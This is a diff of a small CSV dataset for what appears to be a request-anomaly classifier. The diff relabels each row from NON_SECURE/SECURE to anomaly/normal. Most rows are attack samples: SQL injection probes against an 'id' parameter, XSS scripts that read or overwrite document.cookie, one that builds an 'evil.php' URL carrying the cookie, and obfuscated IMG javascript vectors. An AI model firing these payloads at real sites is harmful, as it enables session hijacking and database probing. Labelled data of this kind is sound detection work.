@@ -1,28 +1,28 @@
 message,status
-CONNECT 174.12.23.111 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.112 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.113 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.114 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.115 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.116 application message to accept the request,NON_SECURE
-CONNECT 174.12.23.117 application message to accept the request,NON_SECURE
-home=177&id=1%27%20or%201=@@version-- test ,NON_SECURE
-home=177&id=13%27%20or%201=@@version-- test ,NON_SECURE
-home=177&id=25%27%20or%201=@@version-- test ,NON_SECURE
-home=177&id=101%27%20or%201=@@version-- test ,NON_SECURE
-home=177&id=1000%27%20or%201=@@version-- test ,NON_SECURE
-<script>javascript:alert(‘Executed!’);</script>,NON_SECURE
-<script>javascript: alert(document.cookie);</script>,NON_SECURE
-<script>javascript:void(document.cookie=“session_id=<<other session id>>“);</script>,NON_SECURE
-<script>javascript:void(document.cookie=”username=otherUser”);</script>,NON_SECURE
-<script>var adr = '../evil.php?cakemonster=' + escape(document.cookie);</script>,NON_SECURE
-<script></script>,NON_SECURE
-<script></script>,NON_SECURE
-<IMG SRC=j&#X41vascript:alert('test2')>,NON_SECURE
-<IMG SRC=j&#X41vascript:alert('hacked')>,NON_SECURE
-<IMG SRC=j&#X41vascript:alert('check')>,NON_SECURE
-<IMG SRC=j&#X41vascript:alert('test')>,NON_SECURE
-simple application message to accept the request,SECURE
-service class level code is executed before logic,SECURE
-database insertion is happening,SECURE
+CONNECT 174.12.23.111 application message to accept the request,anomaly
+CONNECT 174.12.23.112 application message to accept the request,anomaly
+CONNECT 174.12.23.113 application message to accept the request,anomaly
+CONNECT 174.12.23.114 application message to accept the request,anomaly
+CONNECT 174.12.23.115 application message to accept the request,anomaly
+CONNECT 174.12.23.116 application message to accept the request,anomaly
+CONNECT 174.12.23.117 application message to accept the request,anomaly
+home=177&id=1%27%20or%201=@@version-- test ,anomaly
+home=177&id=13%27%20or%201=@@version-- test ,anomaly
+home=177&id=25%27%20or%201=@@version-- test ,anomaly
+home=177&id=101%27%20or%201=@@version-- test ,anomaly
+home=177&id=1000%27%20or%201=@@version-- test ,anomaly
+<script>javascript:alert(‘Executed!’);</script>,anomaly
+<script>javascript: alert(document.cookie);</script>,anomaly
+<script>javascript:void(document.cookie=“session_id=<<other session id>>“);</script>,anomaly
+<script>javascript:void(document.cookie=”username=otherUser”);</script>,anomaly
+<script>var adr = '../evil.php?cakemonster=' + escape(document.cookie);</script>,anomaly
+<script></script>,anomaly
+<script></script>,anomaly
+<IMG SRC=j&#X41vascript:alert('test2')>,anomaly
+<IMG SRC=j&#X41vascript:alert('hacked')>,anomaly
+<IMG SRC=j&#X41vascript:alert('check')>,anomaly
+<IMG SRC=j&#X41vascript:alert('test')>,anomaly
+simple application message to accept the request,normal
+service class level code is executed before logic,normal
+database insertion is happening,normal
 
